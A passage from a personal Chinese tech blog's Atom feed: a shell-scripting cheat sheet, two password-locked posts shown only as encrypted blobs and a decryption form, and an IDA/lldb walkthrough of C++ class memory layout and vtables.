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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
</feed>
